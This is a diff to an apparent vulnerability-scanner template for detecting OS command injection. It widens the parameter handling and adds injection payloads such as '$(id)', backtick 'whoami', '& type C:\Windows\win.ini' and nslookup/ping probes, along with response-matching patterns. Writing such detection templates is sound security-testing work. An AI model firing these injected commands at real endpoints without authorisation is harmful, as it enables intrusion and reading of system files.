@@ -1,8 +1,8 @@
 id: generic-command-injection
 info:
   name: Command Injection
-  description: Detects OS command injection in discovered endpoints
-  owasp_category: A03:2025
+  description: Tests for OS command injection in discovered endpoints
+  owasp_category: A03:2021
   severity: critical
   tags:
     - command
@@ -12,8 +12,8 @@ info:
 
 generic:
   endpoint: "{{all_discovered}}"
-  method: GET
-  parameter: "cmd"
+  method: "{{method}}"
+  parameter: "{{input_param}}"
 
   payloads:
     - "; ls -la"
@@ -23,12 +23,20 @@ generic:
     - "$(whoami)"
     - "' && ping -c 1 localhost && echo '"
     - "; sleep 5"
+    - "| dir"
+    - "& type C:\\Windows\\win.ini"
+    - "`whoami`"
+    - "$(id)"
+    - "; nslookup test"
+    - "| nslookup test"
+    - "& ping -n 3 test"
 
   matchers:
     - type: status
       condition: in
       status:
         - 200
+        - 500
     - type: regex
       condition: or
       regex:
@@ -41,6 +49,10 @@ generic:
         - 'PING.*bytes of data'
         - '[0-9]+ packets transmitted'
         - '/bin/bash'
+        - '/bin/sh'
         - 'sh-[0-9.]+'
+        - '\[extensions?~\]'
+        - 'Volume Serial Number'
+        - 'Directory of C:\\'
 
-  matchers_condition: and
+  matchers_condition: or
